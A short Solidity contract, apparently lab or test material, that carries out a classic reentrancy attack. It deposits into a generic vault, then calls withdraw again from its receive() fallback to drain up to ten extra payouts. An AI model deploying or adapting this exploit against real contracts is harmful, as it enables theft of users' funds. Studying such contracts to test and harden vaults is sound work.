
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
}

contract ReentrancyAttack {
    IVault public vault;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks;
    
    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }
    
    function attack() external payable {
        vault.deposit{value: msg.value}();
        maxAttacks = 10;
        attackCount = 0;
        vault.withdraw();
    }
    
    receive() external payable {
        attackCount++;
        if (attackCount < maxAttacks && address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
